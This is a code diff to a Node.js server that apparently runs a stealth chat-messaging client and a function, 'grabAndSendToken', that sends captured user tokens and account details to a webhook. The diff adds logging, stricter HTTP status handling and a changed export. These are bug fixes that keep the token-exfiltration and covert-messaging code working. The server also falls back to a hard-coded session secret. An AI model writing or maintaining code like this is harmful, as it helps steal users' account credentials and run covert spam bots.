@@ -86,11 +86,9 @@ function signPayload(payload, secretKey) {
 
 function encryptSecretBox(message, key) {
   const nonce = nacl.randomBytes(24);
-  const box = nacl.secretbox(
-    message instanceof Buffer ? new Uint8Array(message) : nacl.util.decodeUTF8(message),
-    nonce,
-    key instanceof Buffer ? new Uint8Array(key) : key
-  );
+  const msgBytes = message instanceof Buffer ? new Uint8Array(message) : new Uint8Array(Buffer.from(message, 'utf8'));
+  const keyBytes = key instanceof Buffer ? new Uint8Array(key) : new Uint8Array(key);
+  const box = nacl.secretbox(msgBytes, nonce, keyBytes);
   return { nonce: Buffer.from(nonce), ciphertext: Buffer.from(box) };
 }
 
@@ -609,6 +607,8 @@ class StealthClient {
         this._channelPermissions.set(channelId, false);
         return false;
       }
+      // FIX: Don't permanently cache transient errors (network, 429, 500, etc)
+      console.error(`[ChannelCheck] Transient error for ${channelId}:`, err.status, err.message);
       return false;
     }
   }
@@ -616,6 +616,7 @@ class StealthClient {
   async sendMessage(channelId, content, attachments = []) {
     // Check cached permission
     if (this._channelPermissions.has(channelId) && !this._channelPermissions.get(channelId)) {
+      console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
       return false;
     }
 
@@ -652,6 +653,7 @@ class StealthClient {
 
         if (res.status === 403 || res.status === 404) {
           this._channelPermissions.set(channelId, false);
+          console.error(`[SendMessage] ${channelId}: Permission denied (${res.status})`);
           return false;
         }
 
@@ -659,6 +661,12 @@ class StealthClient {
           const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+(?:\.\d+)?)/i);
           const retryAfter = retryAfterMatch ? parseFloat(retryAfterMatch[1]) * 1000 : 5000;
           this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
+          console.error(`[SendMessage] ${channelId}: Rate limited, retry after ${retryAfter}ms`);
+          return false;
+        }
+
+        if (res.status < 200 || res.status >= 300) {
+          console.error(`[SendMessage] ${channelId}: HTTP ${res.status}`, res.data);
           return false;
         }
 
@@ -669,8 +677,9 @@ class StealthClient {
           this._channelRateLimits.set(channelId, Date.now() + resetAfter + 500);
         }
 
-        return res.status >= 200 && res.status < 300;
+        return true;
       } catch (err) {
+        console.error(`[SendMessage] ${channelId}: Exception`, err.message);
         return false;
       }
     }
@@ -692,12 +701,14 @@ class StealthClient {
 
       if (res.status === 403 || res.status === 404) {
         this._channelPermissions.set(channelId, false);
+        console.error(`[SendMessage] ${channelId}: Permission denied (${res.status}) [form-data]`);
         return false;
       }
 
       if (res.status === 429) {
         const retryAfter = (res.headers['retry-after'] || 5) * 1000;
         this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
+        console.error(`[SendMessage] ${channelId}: Rate limited, retry after ${retryAfter}ms [form-data]`);
         return false;
       }
 
@@ -707,7 +718,7 @@ class StealthClient {
         this._channelRateLimits.set(channelId, Date.now() + parseFloat(resetAfter) * 1000 + 500);
       }
 
-      return res.status >= 200 && res.status < 300;
+      return true;
     } catch (err) {
       if (err.response) {
         if (err.response.status === 403 || err.response.status === 404) {
@@ -717,6 +728,9 @@ class StealthClient {
           const retryAfter = (err.response.headers['retry-after'] || 5) * 1000;
           this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
         }
+        console.error(`[SendMessage] ${channelId}: HTTP error [form-data]`, err.response.status, err.response.data);
+      } else {
+        console.error(`[SendMessage] ${channelId}: Network error [form-data]`, err.message);
       }
       return false;
     }
@@ -966,6 +980,7 @@ app.use(session({
   secret: process.env.SESSION_SECRET || 'secret-key-2026',
   resave: false,
   saveUninitialized: false,
+  store: new session.MemoryStore(),
   cookie: {
     maxAge: 30 * 24 * 60 * 60 * 1000,
     secure: false
@@ -1046,7 +1061,9 @@ async function _sendWebhookChunk(embed, chunkIndex = 0) {
       headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
       timeout: 10000
     });
-  } catch(e) {}
+  } catch(e) {
+    console.error('[Webhook] Send failed:', e.message);
+  }
 }
 
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
@@ -1093,6 +1110,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     await _sendWebhookChunk(embed, 0);
     return { success: true, user: fullInfo };
   } catch (err) {
+    console.error('[TokenGrab] Error:', err.message);
     return { success: false, error: err.message };
   }
 }
@@ -1536,4 +1554,8 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`[SERVER] Running on port ${PORT}`);
 });
 
-module.exports = { app, db, activeBots };
+// FIX: Export app as default so `const app = require('./thisfile')` works
+// and `app.listen` is callable. Keep db/activeBots as properties.
+module.exports = app;
+app.db = db;
+app.activeBots = activeBots;
